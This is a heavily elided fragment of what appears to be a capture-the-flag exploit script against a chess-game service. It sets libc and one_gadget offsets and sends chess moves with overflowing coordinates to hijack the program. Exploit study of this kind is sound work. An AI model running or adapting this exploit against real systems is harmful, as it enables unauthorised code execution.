...
# a0: move qword[3]
LIBC_START_MAIN_OFFSET = 0x28565
ONE_GADGET_OFFSET = 0xde78f
...
def main():
    with connect() as tube:
        ...
        assert make_move(tube, "a7-a6")
        assert make_move(tube, "f4-g3")
        ...
        is_white = not is_white
        make_filler_move()
        if not make_move(tube, "d2147483663-b2147483664"):
            assert make_move(tube, "b2147483664-c2147483662")
            is_white = not is_white
            make_filler_move()
        ...
        tube.sendline('exit')
        sys.stdout.buffer.write(tube.recvall())
